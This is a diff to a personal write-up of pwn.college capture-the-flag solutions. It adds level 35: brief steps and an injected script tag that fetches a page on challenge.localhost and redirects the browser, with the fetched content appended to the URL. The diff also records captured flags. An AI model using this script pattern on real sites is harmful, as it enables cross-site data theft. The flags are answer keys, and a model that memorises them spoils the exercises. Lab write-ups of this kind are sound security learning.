@@ -285,8 +285,19 @@ level-34:  > Run cat /challenge/server and get the endpoint from there and then 
 
           Flag: pwn.college{829OqK0BbjiIebozWDxeEqDeSq5.01NxATNxwyN1YTN0EzW}
 
-level-35:  
+level-35:  > Run cat /challenge/server and get the endpoint from there and then run /challenge/server.
+           > open a new file and write the script.
+           > <script>
+             fetch("http://challenge.localhost/validate?secret_key=zaoktoxw&auth_key=rspirgzf&flag=glwgimih")
+                  .then(response=> response.text())
+                  .then(website_content=> window.location="http://challenge.localhost/validate?"+website_content);
+             </script>
+           > run /challenge/client
+           > get the flag.
 
+          Flag: pwn.college{whLthxF5e9lBCYfnCEhxjkOND5n.0FOxATNxwyN1YTN0EzW}
+
+level-36:  
 
 
 
